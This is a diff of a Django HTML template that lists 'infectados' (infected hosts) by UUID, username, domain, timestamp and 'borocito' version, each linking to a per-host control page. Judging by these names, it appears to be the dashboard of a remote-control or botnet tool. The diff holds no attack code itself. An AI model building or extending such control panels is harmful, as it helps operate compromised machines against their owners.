@@ -2,18 +2,16 @@
 
 {% block content %}
 <div class="container mt-4">
-    <div class="row">
-        <div class="col-4">
-            <div class="list-group">
-                {% for infectado in infectados %}
-                <a href="#" class="list-group-item list-group-item-action">
-                    {{ infectado }}
-                </a>
-                {% endfor %}
+    <div class="list-group">
+        {% for infectado in infectados %}
+        <a href="{% url 'web:user-control-instance' infectado.uuid %}" class="list-group-item list-group-item-action">
+            <div class="d-flex w-100 justify-content-between">
+                <h5 class="mb-1">{{ infectado.uuid }}</h5>
+                <small>{{ infectado.modified_at }}</small>
             </div>
-        </div>
-        <div class="col">
-        </div>
+            <small>{{ infectado.username }} @ {{ infectado.domain }} running {{ infectado.borocito }} </small> 
+        </a>
+        {% endfor %}
     </div>
 </div>
 {% endblock %}
